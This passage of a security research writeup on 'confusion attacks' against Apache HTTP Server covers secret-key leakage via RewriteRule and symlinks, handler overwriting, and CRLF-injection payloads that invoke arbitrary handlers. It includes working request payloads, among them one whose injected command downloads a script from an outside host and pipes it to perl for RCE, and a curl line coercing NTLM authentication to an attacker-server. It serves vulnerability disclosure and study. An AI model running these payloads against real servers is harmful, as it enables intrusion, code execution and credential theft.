+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ file /usr/share/redmine/instances/</span><br><span class="line"> symbolic <span class="built_in">link</span> to /var/lib/redmine/</span><br><span class="line">$ file /var/lib/redmine/config/</span><br><span class="line"> symbolic <span class="built_in">link</span> to /etc/redmine/default/</span><br><span class="line">$ <span class="built_in">ls</span> /etc/redmine/default/</span><br><span class="line"> database.yml    secret_key.txt</span><br></pre></td></tr></table></figure>
+<p>Thus, through an insecure <code>RewriteRule</code> and two Symbolic Links, we can easily access the application secret key used by Redmine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f</span><br><span class="line"> HTTP/1.1 200 OK</span><br><span class="line"> Server: Apache/2.4.59 (Ubuntu) </span><br><span class="line"> ...</span><br><span class="line"> 6d222c3c3a1881c865428edb79a74405</span><br></pre></td></tr></table></figure>
+<p>And since Redmine is a Ruby on Rails application, the content of <code>secret_key.txt</code> is actually the key used for signing and encrypting. The next step should be familiar to those who have attacked RoR before: by embedding malicious Marshal objects, signed and encrypted with the known keys, into cookies, and then achieving remote code execution through Server-Side Deserialization!</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/9f927a5ccd4a2a69-08.png"></p>
+<h2 id="🔥-3-Handler-Confusion"><a href="#🔥-3-Handler-Confusion" class="headerlink" title="🔥 3. Handler Confusion"></a>🔥 3. Handler Confusion</h2><p>The final attack I’m going to introduce is the confusion based on Handler. This attack also leverages a piece of technical debt that has been left over from the legacy architecture of Apache HTTP Server. Let’s quickly understand this technical debt through an example — if today you want to run the classic <code>mod_php</code> on Apache HTTP Server, which of the following two directives do you use?</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddHandler</span> application/x-httpd-php .php</span><br><span class="line"><span class="attribute">AddType</span>    application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
+<p>The answer is — both can correctly get PHP running! Here are the two directive syntaxes, and you can see that not only are the usages similar, but even the effects are exactly the same. Why did Apache HTTP Server initially design two different directives doing the same thing?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddHandler handler-name extension [extension] ...</span><br><span class="line">AddType media-type extension [extension] ...</span><br></pre></td></tr></table></figure>
+<p>Actually, <code>handler-name</code> and <code>media-type</code> represent different fields within Httpd’s internal structure, corresponding to <code>r-&gt;handler</code> and <code>r-&gt;content_type</code>, respectively. The fact that <strong>users can use them interchangeably without realizing it is thanks to a piece of code that has been in Apache HTTP Server since <a target="_blank" rel="noopener" href="https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c">its early development in 1996</a></strong>:</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420">server&#x2F;config.c#L420</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">AP_CORE_DECLARE(<span class="type">int</span>) ap_invoke_handler(request_rec *r) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!r-&gt;handler) &#123;</span><br><span class="line">        <span class="keyword">if</span> (r-&gt;content_type) &#123;</span><br><span class="line">            handler = r-&gt;content_type;</span><br><span class="line">            <span class="keyword">if</span> ((p=ap_strchr_c(handler, <span class="string">&#x27;;&#x27;</span>)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="type">char</span> *new_handler = (<span class="type">char</span> *)apr_pmemdup(r-&gt;pool, handler,</span><br><span class="line">                                                        p - handler + <span class="number">1</span>);</span><br><span class="line">                <span class="type">char</span> *p2 = new_handler + (p - handler);</span><br><span class="line">                handler = new_handler;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* exclude media type arguments */</span></span><br><span class="line">                <span class="keyword">while</span> (p2 &gt; handler &amp;&amp; p2[<span class="number">-1</span>] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    --p2; <span class="comment">/* strip trailing spaces */</span></span><br><span class="line"></span><br><span class="line">                *p2=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            handler = AP_DEFAULT_HANDLER_NAME;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r-&gt;handler = handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    result = ap_run_handler(r);</span><br></pre></td></tr></table></figure>
+<p>You can see that before entering the <code>ap_run_handler()</code>, if <code>r-&gt;handler</code> is empty, the content of the <code>r-&gt;content_type</code> is used as the final module handler. This is also why <code>AddType</code> and <code>AddHandler</code> have the identical effect, because the <code>media-type</code> is eventually converted into the <code>handler-name</code> before handling. So, our third Handler Confusion is mainly developed around this behavior.</p>
+<h3 id="⚔️-Primitive-3-1-Overwrite-the-Handler"><a href="#⚔️-Primitive-3-1-Overwrite-the-Handler" class="headerlink" title="⚔️ Primitive 3-1. Overwrite the Handler"></a>⚔️ Primitive 3-1. Overwrite the Handler</h3><p>By understanding this conversion mechanism, the first primitive is — <strong>Overwrite the Handler</strong>. Imagine if today the target Apache HTTP Server uses <code>AddType</code> to run PHP.</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AddType</span> application/x-httpd-php  .php</span><br></pre></td></tr></table></figure>
+<p>In the normal process, when accessing <code>http://server/config.php</code>, <code>mod_mime</code>, during the <code>type_checker</code> phase, Httpd copies the corresponding content into <code>r-&gt;content_type</code> based on the file extension set by <code>AddType</code>. Since <code>r-&gt;handler</code> is not assigned during the entire HTTP lifecycle, <code>ap_invoke_handler()</code> will treat <code>r-&gt;content_type</code> as the handler, ultimately calling <code>mod_php</code> to handle the request.</p>
+<p>However, what happens if any module “accidentally” overwrites <code>r-&gt;content_type</code> before reaching <code>ap_invoke_handler()</code>?</p>
+<h4 id="✔️-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code"><a href="#✔️-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code" class="headerlink" title="✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code"></a>✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code</h4><p>The first exploitation of this primitive is to disclose arbitrary PHP source code by the “accidentally-overwrite”. This technique was first mentioned by Max Dmitriev in his research presented at ZeroNights 2021 (kudos to him!), and you can check his slides here:</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf">Apache 0day bug, which still nobody knows of, and which was fixed accidentally</a></p>
+</blockquote>
+<p>Max Dmitriev observed that by sending an incorrect <code>Content-Length</code>, the remote Httpd server would trigger an unexpected error and inadvertently return the source code of PHP script. Upon investigating the process, he discovered that the issue was due to ModSecurity not properly handling the return value of <code>AP_FILTER_ERROR</code> while using the Apache Portable Runtime (APR) library, leading to a <a target="_blank" rel="noopener" href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a>. When an error occurred, Httpd attempts to send out HTML error messages, thus accidentally overwriting <code>r-&gt;content_type</code> to <code>text/html</code>.</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/0bc450787c481aef-09.png"></p>
+<p>Because ModSecurity did not properly handle the return values, the internal HTTP lifecycle that should have stopped continued. This “side effect” also overwrote the originally added <code>Content-Type</code>, resulting in files that should have been processed as PHP being treated as plain documents, exposing its source code and sensitive settings. 🤫</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v http://127.0.0.1/info.php -H <span class="string">&quot;Content-Length: x&quot;</span></span><br><span class="line">&gt; HTTP/1.1 400 Bad Request</span><br><span class="line">&gt; Date: Mon, 29 Jul 2024 05:32:23 GMT</span><br><span class="line">&gt; Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">&gt; Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">...</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p>In theory, all configurations based on <code>Content-Type</code> are vulnerable to this type of attack, so apart from the <code>php-cgi</code> paired with <code>mod_actions</code> shown in Max’s slides, pure <code>mod_php</code> coupled with <code>AddType</code> is also affected.</p>
+<p>It’s worth mentioning that this side effect was corrected as a <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a">request parser bug</a> in Apache HTTP Server version 2.4.44, thus treating this “vulnerability” as fixed until I picked it up again. However, since the root cause is still ModSecurity not handling errors properly, the same behavior can still be successfully reproduced if another code path that triggers <code>AP_FILTER_ERROR</code> is found.</p>
+<p><em>P.S. This issue was reported to ModSecurity through the official security mail on 6&#x2F;20, and the Project Co-Leader suggested returning to the original <a target="_blank" rel="noopener" href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">GitHub Issue</a> for discussion.</em></p>
+<h4 id="✔️-3-1-2-Overwrite-Handler-to-██████-███████-██████"><a href="#✔️-3-1-2-Overwrite-Handler-to-██████-███████-██████" class="headerlink" title="✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████"></a>✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████</h4><p>Based on the <a target="_blank" rel="noopener" href="https://github.com/owasp-modsecurity/ModSecurity/issues/2514">double response</a> behavior and its side effects mentioned earlier, this primitive could lead to other more cool exploitations. However, as this issue has not been fully fixed, further exploitation will be disclosed after the issue is fully resolved.</p>
+<h3 id="⚔️-Primitive-3-2-Invoke-Arbitrary-Handlers"><a href="#⚔️-Primitive-3-2-Invoke-Arbitrary-Handlers" class="headerlink" title="⚔️ Primitive 3-2. Invoke Arbitrary Handlers"></a>⚔️ Primitive 3-2. Invoke Arbitrary Handlers</h3><p>Let’s think more carefully about the previous Overwrite Handler primitive, although it’s caused by ModSecurity not properly handling errors, leading to the request being set with the wrong <code>Content-Type</code>, the deeper fundamental root cause should be — <strong>when using <code>r-&gt;content_type</code>, Apache HTTP Server actually cannot distinguish its semantics; this field can be set by directive during the request phase or used as the <code>Content-Type</code> header in the server response</strong>.</p>
+<p>Theoretically, if you can control the <code>Content-Type</code> header in the server response, you could invoke arbitrary module handlers through this legacy code snippet. This is the last primitive of Handler Confusion — <strong>invoking any internal module handler</strong>!</p>
+<p>However, there’s still one last piece of the puzzle. In Httpd, all modifications to <code>r-&gt;content_type</code> from the server response occur after that legacy code. So, even if you can control the value of that field, at that point in the HTTP lifecycle, it’s too late to do further exploitation… is that right?</p>
+<p>We turned to <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc3875">RFC 3875</a> for a rescue! RFC 3875 is a specification about CGI, and <a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2">Section 6.2.2</a> defines a Local Redirect Response behavior:</p>
+<blockquote>
+<p>The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.</p>
+</blockquote>
+<p>Simply put, the specification mandates that under certain conditions, CGI must use Server-Side resources to handle redirects. A close examination of <code>mod_cgi</code> implementation of this specification reveals:</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983">modules&#x2F;generators&#x2F;mod_cgi.c#L983</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((ret = ap_scan_script_header_err_brigade_ex(r, bb, sbuf,          <span class="comment">// &lt;------ [1]</span></span><br><span class="line">                                                APLOG_MODULE_INDEX)))</span><br><span class="line">&#123;</span><br><span class="line">    ret = log_script(r, conf, ret, dbuf, sbuf, bb, script_err);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == HTTP_NOT_MODIFIED) &#123;</span><br><span class="line">        r-&gt;status = ret;</span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = apr_table_get(r-&gt;headers_out, <span class="string">&quot;Location&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (location &amp;&amp; r-&gt;status == <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (location &amp;&amp; location[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; r-&gt;status == <span class="number">200</span>) &#123;          <span class="comment">// &lt;------ [2]</span></span><br><span class="line">    <span class="comment">/* This redirect needs to be a GET no matter what the original</span></span><br><span class="line"><span class="comment">     * method was.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    r-&gt;method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">    r-&gt;method_number = M_GET;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We already read the message body (if any), so don&#x27;t allow</span></span><br><span class="line"><span class="comment">     * the redirected request to think it has one.  We can ignore</span></span><br><span class="line"><span class="comment">     * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    apr_table_unset(r-&gt;headers_in, <span class="string">&quot;Content-Length&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ap_internal_redirect_handler(location, r);                     <span class="comment">// &lt;------ [3]</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Initially, <code>mod_cgi</code> executes<sup>[1]</sup> CGI and scans its output to set the corresponding headers such as <code>Status</code> and <code>Content-Type</code>. If<sup>[2]</sup> the returned <code>Status</code> is 200 and the <code>Location</code> header starts with a <code>/</code>, the response is treated as a Server-Side Redirection and should be processed<sup>[3]</sup> internally. A closer look at the implementation of <code>ap_internal_redirect_handler()</code> shows:</p>
+<p><em><strong>Path: <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800">modules&#x2F;http&#x2F;http_request.c#L800</a></strong></em></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">AP_DECLARE(<span class="type">void</span>) ap_internal_redirect_handler(<span class="type">const</span> <span class="type">char</span> *new_uri, request_rec *r)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> access_status;</span><br><span class="line">    request_rec *new = internal_internal_redirect(new_uri, r);    <span class="comment">// &lt;------ [1]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ap_die was already called, if an error occured */</span></span><br><span class="line">    <span class="keyword">if</span> (!new) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r-&gt;handler)</span><br><span class="line">        ap_set_content_type(new, r-&gt;content_type);                <span class="comment">// &lt;------ [2]</span></span><br><span class="line">    access_status = ap_process_request_internal(new);             <span class="comment">// &lt;------ [3]</span></span><br><span class="line">    <span class="keyword">if</span> (access_status == OK) &#123;</span><br><span class="line">        access_status = ap_invoke_handler(new);                   <span class="comment">// &lt;------ [4]</span></span><br><span class="line">    &#125;</span><br><span class="line">    ap_die(access_status, new);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Httpd first creates<sup>[1]</sup> a new request structure and copie<sup>[2]</sup> the current <code>r-&gt;content_type</code> into it. After processing<sub>[3]</sub> the lifecycle, it calls<sup>[4]</sup> <code>ap_invoke_handler()</code> — the place including the legacy transformation. So, <strong>in Server-Side Redirects, if you can control the response headers, you can invoke any module handler within Httpd</strong>. Basically, all CGI implementations in Apache HTTP Server follow this behavior, and here’s a simple list:</p>
+<ul>
+<li>mod_cgi</li>
+<li>mod_cgid</li>
+<li>mod_wsgi</li>
+<li>mod_uwsgi</li>
+<li>mod_fastcgi</li>
+<li>mod_perl</li>
+<li>mod_asis</li>
+<li>mod_fcgid</li>
+<li>mod_proxy_scgi</li>
+<li>…</li>
+</ul>
+<p>As for how to trigger this server-side redirect in real-world scenarios? Since you need at least control over the response’s <code>Content-Type</code> and part of the <code>Location</code>, here are two scenarios for reference:</p>
+<ol>
+<li>CRLF Injection in the CGI response headers, allowing overwriting of existing HTTP headers by new lines.</li>
+<li>SSRF that can completely control the response headers, such as a project hosted on <code>mod_wsgi</code> like <a target="_blank" rel="noopener" href="https://django-revproxy.readthedocs.io/en/latest/">django-revproxy</a>.</li>
+</ol>
+<p>The following examples are all based on this insecure CRLF Injection for the purpose of demonstration:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> CGI;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$q</span> = CGI-&gt;new;</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$redir</span> = <span class="variable">$q</span>-&gt;param(<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$redir</span> =~ m&#123;^https?:<span class="regexp">//</span>&#125;) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Location: <span class="variable">$redir</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-Type: text/html\n\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="✔️-3-2-1-Arbitrary-Handler-to-Information-Disclosure"><a href="#✔️-3-2-1-Arbitrary-Handler-to-Information-Disclosure" class="headerlink" title="✔️ 3-2-1. Arbitrary Handler to Information Disclosure"></a>✔️ 3-2-1. Arbitrary Handler to Information Disclosure</h4><p>Starting with invoking an arbitrary handler to disclose information, we use the built-in <code>server-status</code> handler in Apache HTTP Server, which is typically only allowed to be accessed locally:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;Location /server-status&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> server-status</span><br><span class="line">    <span class="attribute">Require</span> local</span><br><span class="line"><span class="section">&lt;/Location&gt;</span></span><br></pre></td></tr></table></figure>
+<p>With the ability to invoke any handler, it becomes possible to overwrite the <code>Content-Type</code> to access sensitive information that should not be accessible remotely:</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;ooo</strong></em> %0d%0a<br><em><strong>Content-Type:server-status</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
+<p><img src="/posts/2024-08-confusion-attacks-en/dacded9bea644dff-10.png"></p>
+<h4 id="✔️-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts"><a href="#✔️-3-2-2-Arbitrary-Handler-to-Misinterpret-Scripts" class="headerlink" title="✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts"></a>✔️ 3-2-2. Arbitrary Handler to Misinterpret Scripts</h4><p>It’s also easy to transform an image with a legitimate extension into a PHP backdoor. For instance, this primitive allows specifying <code>mod_php</code> to execute embedded malicious code within the image, like:</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;uploads&#x2F;avatar.webp</strong></em> %0d%0a<br><em><strong>Content-Type:application&#x2F;x-httpd-php</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
+<h4 id="✔️-3-2-2-Arbitrary-Handler-to-Full-SSRF"><a href="#✔️-3-2-2-Arbitrary-Handler-to-Full-SSRF" class="headerlink" title="✔️ 3-2-2. Arbitrary Handler to Full SSRF"></a>✔️ 3-2-2. Arbitrary Handler to Full SSRF</h4><p>Calling the <code>mod_proxy</code> to access any protocol on any URL is, of course, straightforward:</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;ooo</strong></em> %0d%0a<br><em><strong>Content-Type:proxy:http<span>:&#x2F;&#x2F;example.com&#x2F;%3F</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
+<p>Moreover, this is also a full-control SSRF where you can control all request headers and obtain all HTTP responses! A slight disappointment is when accessing Cloud Metadata, <code>mod_proxy</code> automatically adds an <code>X-Forwarded-For</code> header, which gets blocked by EC2 and GCP’s <a target="_blank" rel="noopener" href="https://cloud.google.com/compute/docs/metadata/querying-metadata#limitations">Metadata protection mechanisms</a>, otherwise, this would be an even more powerful primitive.</p>
+<h4 id="✔️-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket"><a href="#✔️-3-2-3-Arbitrary-Handler-to-Access-Local-Unix-Domain-Socket" class="headerlink" title="✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket"></a>✔️ 3-2-3. Arbitrary Handler to Access Local Unix Domain Socket</h4><p>However, <code>mod_proxy</code> offers a more “convenient” feature — it can access local Unix Domain Sockets! 😉</p>
+<p>Here’s a demonstration accessing PHP-FPM’s local Unix Domain Socket to execute a PHP backdoor located in <code>/tmp/</code>:</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a<br><em><strong>Location:&#x2F;ooo</strong></em> %0d%0a<br><em><strong>Content-Type:proxy:unix:&#x2F;run&#x2F;php&#x2F;php-fpm.sock|fcgi:&#x2F;&#x2F;127.0.0.1&#x2F;tmp&#x2F;ooo.php</strong></em> %0d%0a<br>%0d%0a</p>
+</blockquote>
+<p>Theoretically, this technique has even more potential, such as protocol smuggling (smuggling FastCGI in HTTP&#x2F;HTTPS protocols 😏) or exploiting other vulnerable local sockets. These possibilities are left for interested readers to explore.</p>
+<h4 id="✔️-3-2-4-Arbitrary-Handler-to-RCE"><a href="#✔️-3-2-4-Arbitrary-Handler-to-RCE" class="headerlink" title="✔️ 3-2-4. Arbitrary Handler to RCE"></a>✔️ 3-2-4. Arbitrary Handler to RCE</h4><p>Finally, let’s demonstrate how to transform this primitive into an RCE using a common CTF trick! Since the official <a target="_blank" rel="noopener" href="https://hub.docker.com/_/php">PHP Docker</a> image includes PEAR, a command-line PHP package management tool, using its <code>Pearcmd.php</code> as an entry point allows us to achieve further exploitation. You can check this article — <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHP LFI Summary</a>, written by <a target="_blank" rel="noopener" href="https://x.com/phithon_xg">Phith0n</a> for details!</p>
+<p>Here we utilize a Command Injection within <code>run-tests</code> to complete the entire exploit chain, detailed as follows:</p>
+<blockquote>
+<p>http<span>:&#x2F;&#x2F;server&#x2F;cgi-bin&#x2F;redir.cgi?r&#x3D;http:&#x2F;&#x2F; %0d%0a  </p>
+<p><em><strong>Location:&#x2F;ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw&#x2F;x|perl) %2b alltests.php</strong></em> %0d%0a  </p>
+<p><em><strong>Content-Type:proxy:unix:&#x2F;run&#x2F;php&#x2F;php-fpm.sock|fcgi:&#x2F;&#x2F;127.0.0.1&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php</strong></em> %0d%0a  </p>
+<p>%0d%0a</p>
+</blockquote>
+<p>It’s common to see CRLF Injection or Header Injection being reported as XSS in Security Advisories or Bug Bounties. While it is true that these can sometimes chain to impactful vulnerabilities like Account Takeover through SSO, please don’t forget that they can also lead to Server-Side RCE, as this demonstration proves its potential!</p>
+<p><img src="/posts/2024-08-confusion-attacks-en/c46787187d97fc85-11.png"></p>
+<h2 id="🔥-4-Other-Vulnerabilities"><a href="#🔥-4-Other-Vulnerabilities" class="headerlink" title="🔥 4. Other Vulnerabilities"></a>🔥 4. Other Vulnerabilities</h2><p>While this essentially covers the Confusion Attacks, some minor vulnerabilities discovered during our research of Apache HTTP Server are worth mentioning separately.</p>
+<h3 id="⚔️-CVE-2024-38472-Windows-UNC-based-SSRF"><a href="#⚔️-CVE-2024-38472-Windows-UNC-based-SSRF" class="headerlink" title="⚔️ CVE-2024-38472 - Windows UNC-based SSRF"></a>⚔️ CVE-2024-38472 - Windows UNC-based SSRF</h3><p>Firstly, the Windows implementation of the <code>apr_filepath_merge()</code> function allows the use of UNC paths, which allows attackers to coerce NTLM authentication to any host. Here we list two different triggering paths:</p>
+<h4 id="✔️-Triggered-via-HTTP-Request-Parser"><a href="#✔️-Triggered-via-HTTP-Request-Parser" class="headerlink" title="✔️ Triggered via HTTP Request Parser"></a>✔️ Triggered via HTTP Request Parser</h4><p>Direct triggering through an HTTP request parser in Httpd requires additional configuration, which might seem impractical at first glance but often appears with Tomcat (<code>mod_jk</code>, <code>mod_proxy_ajp</code>) or pairing with <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/en/mod/core.html#allowencodedslashes">PATH_INFO</a>:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AllowEncodedSlashes</span> <span class="literal">On</span></span><br></pre></td></tr></table></figure>
+<p>Additionally, since Httpd rewrote its core HTTP request parser logic after 2.4.49, triggering the vulnerability in versions above requires an additional configuration:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">AllowEncodedSlashes</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">MergeSlashes</span> <span class="literal">Off</span></span><br></pre></td></tr></table></figure>
+<p>By using two <code>%5C</code> can force Httpd to coerce NTLM authentication to an <code>attacker-server</code>, and practically, this SSRF can be converted into RCE through <a target="_blank" rel="noopener" href="https://en.hackndo.com/ntlm-relay/">NTLM Relay</a>!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://server/%5C%5Cattacker-server/path/to</span><br></pre></td></tr></table></figure>
+
